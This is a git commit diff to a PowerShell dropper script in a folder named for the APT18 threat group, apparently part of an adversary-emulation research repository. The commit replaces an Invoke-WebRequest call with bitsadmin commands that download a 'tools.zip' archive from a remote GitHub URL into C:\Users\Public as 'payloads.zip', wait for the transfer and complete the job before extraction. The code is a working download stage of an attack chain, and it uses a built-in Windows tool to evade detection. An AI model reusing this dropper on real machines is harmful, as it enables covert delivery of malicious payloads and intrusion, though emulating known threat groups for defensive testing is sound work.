e0581db57c83261ee46b4a291621894b8057cb10
Alekzandr <kyle.topasna@gmail.com>
2023-12-17 23:07:12 -0900

    fixed dropper to use bitsadmin for download

--- APT18/Scenario 2/dropper.ps1
+++ APT18/Scenario 2/dropper.ps1
@@ -3,7 +3,27 @@ $url = "https://github.com/alekzandr/Research/raw/main/APT18/Scenario%202/tools.
 $zipPath = "C:\Users\Public\payloads.zip"
 
 # Download the ZIP file
-Invoke-WebRequest -Uri $url -OutFile $zipPath
+# Invoke-WebRequest -Uri $url -OutFile $zipPath
+
+# Define the URL of the ZIP file and the local path to save it
+$url = "https://github.com/alekzandr/Research/raw/main/APT18/Scenario%202/tools.zip"
+$zipPath = "C:\Users\Public\payloads.zip"
+
+# Download the ZIP file
+# Invoke-WebRequest -Uri $url -OutFile $zipPath
+
+# Download the ZIP file using bitsadmin
+$bitsJobName = "DownloadZip"
+bitsadmin /create $bitsJobName
+bitsadmin /addfile $bitsJobName $url $zipPath
+bitsadmin /resume $bitsJobName
+# Wait for the download to complete
+do {
+    Start-Sleep -Seconds 2
+    $jobState = bitsadmin /info $bitsJobName /verbose | Select-String "STATE:" -Context 0,1
+} while ($jobState -notmatch "TRANSFERRED")
+# Complete the BITS job
+bitsadmin /complete $bitsJobName
 
 # Define the extraction path
 $extractPath = "C:\Users\Public\payloads"
